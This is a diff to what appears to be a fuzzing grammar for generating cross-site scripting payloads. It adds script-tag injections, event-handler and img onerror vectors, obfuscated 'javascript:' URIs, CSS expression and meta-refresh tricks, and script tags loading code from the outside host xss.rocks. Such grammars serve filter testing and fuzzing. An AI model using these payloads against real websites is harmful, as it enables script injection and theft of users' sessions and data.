@@ -2,21 +2,53 @@
 
 payload :=
 	+attack+
-	+outbreak++attack+
 
 attack :=
 	+attacks_js+
-	+attacks_html+
-
+	+outbreak++attacks_html+
+	
+outbreak := 
+	+quote++bracket_gt+
+	+bracket_lt+/+tag_html++bracket_gt+
+	+outbreak++bracket_lt+/+tag_html++bracket_gt+
+	+bracket_lt+img++quote++quote++quote++bracket_gt+
+	
 attacks_js :=
 	+quote++space++event+=+quote++payload_attack++quote++bracket_gt+
-	+bracket_lt++tag_js++bracket_gt++space++payload_attack++bracket_lt+/+tag_js++bracket_gt+
-	
-attacks_html :=
-	+bracket_lt++tag_html++space++event+=+payload_attack++bracket_gt+
-	+bracket_lt+img+space+src=0+space+onerror=+payload_attack++space+/+bracket_gt+
-	+bracket_lt++tag_html++bracket_gt++quote++space++event++space++quote++payload_attack++bracket_lt++tag_html++bracket_gt+
+	+bracket_lt++tag_script++bracket_gt++space++payload_attack++bracket_lt+/+tag_script++bracket_gt+
+	+outbreak++bracket_lt++tag_script++bracket_gt++space++payload_attack++bracket_lt+/+tag_script++bracket_gt+
+	+bracket_lt++tag_script+/+random_text++space++src_attribute+=+quote+http://xss.rocks/xss.js+quote++bracket_gt++bracket_lt+/+tag_script++bracket_gt+
+	+bracket_lt++bracket_lt++tag_script++bracket_gt++payload_attack+;//+bracket_lt++bracket_lt+/+tag_script++bracket_gt+
+	+bracket_lt++space++src_attribute+=http://xss.rocks/xss.js?+bracket_lt++tag_html++bracket_gt+
+	\+quote++payload_attack+;//
 
+attacks_html :=
+	+bracket_lt++tag_html++space++event+=+quote++payload_attack++quote++bracket_gt+xss+bracket_lt+/+tag_html++bracket_gt+
+	+bracket_lt+img+space++src_attribute+=+src_value++space++event+=+quote++payload_attack++quote++bracket_gt+xss+bracket_lt+/img+bracket_gt+
+	+bracket_lt+img+space++src_attribute+=+quote++tag_js+:+payload_attack+;+quote++bracket_gt+	
+	+bracket_lt+input+space+type=+quote+image+quote++space++src_attribute+=+quote++tag_script+:+payload_attack++quote++bracket_gt+
+	+bracket_lt++tag_html++space+background=+quote++tag_js+:+payload_attack++quote++bracket_gt+
+	+bracket_lt+style+bracket_gt+li+space+{list-style-image:+space+url(+quote++tag_js+:+payload_attack++quote+}+bracket_lt+/style+bracket_gt++bracket_lt+ul+bracket_gt++bracket_lt+li+bracket_gt++random_text++bracket_lt+/br+bracket_gt+
+	+bracket_lt++tag_html++space++event++space+=+payload_attack++bracket_gt+
+	+bracket_lt+/+tag_html++space++event++space+=+payload_attack++bracket_gt+
+	+bracket_lt++tag_html++space+=+quote+&{+payload_attack+}+quote++bracket_gt+
+	+bracket_lt+link+space+rel=+quote+stylesheet+quote++space+href=+quote++tag_js+:+payload_attack+;+quote++bracket_gt+
+	+bracket_lt+img+space+style=+quote++random_text+:expr/*+random_text+*/ession(+payload_attack+)+quote++bracket_gt+
+	+bracket_lt+style+space+.xss{background-image:url(+quote++tag_js+:+payload_attack++quote+);}+bracket_lt+/style+bracket_gt++bracket_lt++tag_html++space+class=xss+bracket_gt+
+	+bracket_lt+style+spacetype=+quote+text/css+quote++bracket_gt+body{background:url(+quote++tag_js+:+payload_attack++quote+)}+bracket_lt+/style+bracket_gt+
+	+bracket_lt+meta+space+http-equiv=+quote+refresh+quote++space+content=+quote+0;url=+tag_js+:+payload_attack+;+quote++bracket_gt+
+
+src_value :=
+	+space+
+	#
+	/
+	+random_text+
+
+src_attribute :=
+	src
+	dynsrc
+	lowsrc
+	
 tag_html :=
 	a
 	abbr
@@ -136,8 +168,13 @@ tag_html :=
 	video
 	wbr
 
-tag_js :=
+tag_script :=
 	script
+	
+tag_js :=
+	javascript
+	jav+space+ascript
+	javas+space+cript
 
 event :=
 	onclick
@@ -229,11 +266,6 @@ event :=
 	ontouchmove
 	ontouchstart
 	
-outbreak := 
-	+quote++bracket_gt+
-	+bracket_lt+/+tag_html++bracket_gt+
-	+outbreak++bracket_lt+/+tag_html++bracket_gt+
-	
 quote :=
 	"
 	'
@@ -296,6 +328,7 @@ payload_attack :=
 	alert(+payload_text+)
 	promt(+payload_text+)
 	confirm(+payload_text+)
+	+tag_script+:alert(+payload_text+);
 	
 payload_text :=
 	"dharma+random_text+"
